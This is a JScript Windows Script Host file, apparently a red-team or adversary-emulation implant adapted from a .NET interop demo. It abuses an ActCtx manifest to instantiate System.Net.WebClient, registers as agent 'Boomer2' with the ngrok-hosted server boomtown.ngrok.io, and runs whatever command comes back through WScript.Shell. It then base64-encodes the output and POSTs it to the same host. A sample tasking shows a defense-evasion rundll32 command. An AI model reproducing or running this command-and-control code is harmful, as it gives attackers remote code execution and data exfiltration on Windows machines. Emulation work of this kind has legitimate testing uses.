//    This file is part of DotNetInteropDemos
//    Copyright (C) James Forshaw 2017
//
//    DotNetInteropDemos is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    DotNetInteropDemos is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with DotNetInteropDemos.  If not, see <http://www.gnu.org/licenses/>.

// Original examples here https://github.com/tyranid/DotNetInteropDemos/blob/master/webclient_textmanifest.js

/* Create a simple TTP 
ipconfig


*/



// Create Base64 Object, supports encode, decode 
	var Base64={characters:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(a){Base64.characters;var r="",c=0;do{var e=a.charCodeAt(c++),t=a.charCodeAt(c++),h=a.charCodeAt(c++),s=(e=e||0)>>2&63,A=(3&e)<<4|(t=t||0)>>4&15,o=(15&t)<<2|(h=h||0)>>6&3,B=63&h;t?h||(B=64):o=B=64,r+=Base64.characters.charAt(s)+Base64.characters.charAt(A)+Base64.characters.charAt(o)+Base64.characters.charAt(B)}while(c<a.length);return r}};
// We'll base64 endode /decode stdout to stay sane. :)



var manifest = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1"><assemblyIdentity name="System" version="4.0.0.0" publicKeyToken="B77A5C561934E089" /><clrClass clsid="{7D458845-B4B8-30CB-B2AD-FC4960FCDF81}" progid="System.Net.WebClient" threadingModel="Both" name="System.Net.WebClient" runtimeVersion="v4.0.30319" /></assembly>';

try {
	var ax = new ActiveXObject("Microsoft.Windows.ActCtx");
	ax.ManifestText = manifest;
	var obj = ax.CreateObject("System.Net.WebClient");
	//WScript.Echo(obj.DownloadString("https://boomtown.ngrok.io"));
	var JSONString =  '{"Name":"Boomer2","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["psh", "cmd"],"Range":"home","Pwd":"","Sleep":10,"Executing":"","Links":[]}'

	var response = obj.UploadString("http://boomtown.ngrok.io", JSONString);
	WScript.Echo(response);
	
	
	// classic WSH JScript version
	var htmlfile = new ActiveXObject('htmlfile'), JSON;
	htmlfile.write('<meta http-equiv="x-ua-compatible" content="IE=9" />');
	htmlfile.close(JSON = htmlfile.parentWindow.JSON);
	var jsonData = (JSON.parse(response));
	
	
	
	
	var c = "";
	var id_task = "";
	var operation = "";
	
	for (var i = 0; i < jsonData.links.length; i++) {
		var counter = jsonData.links[i];
		WScript.Echo(counter.ID); //
		WScript.Echo(counter.Request); //
		c = counter.Request;
		id_task = counter.ID;
		operation = counter.operation;
	}
	
	r = new ActiveXObject("WScript.Shell").Exec(c);
	var so;
	
	while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
	var p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
	p.Open("POST","http://boomtown.ngrok.io",false);  // Just another way to send back results.
	var so_b64 = Base64.encode(so); //base64 encode stdout.
	var JSONResponse = '{"Name":"Boomer2","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["psh", "cmd"],"Range":"home","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"cmd","Payload":"","Request":"'+c+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"9999"}]}';
	
	p.Send(JSONResponse);

	
	
} catch(e) {
	WScript.Echo("Error: " + e.message);
}

/* Sample Output

{"links":[{"ID":"e13e3cb1-6bd9-4f6d-9b72-8baeb5a0b68b","ttp":"ba4452fa-b662-49ef-bd1e-3859b95bcfb6","tactic":"defense-evasion","Executor":"cmd","Request":"rundll32.exe shell32.dll,ShellExec_RunDLL \"C:UsersMobileDocuments\"","Payload":""}]}
TODO:
Loop/Sleep
Parse JSON - Try to find a useful .NET class.
execute x done
Return Response. x done
figure out proper status
proper error handling / try catch.

*/
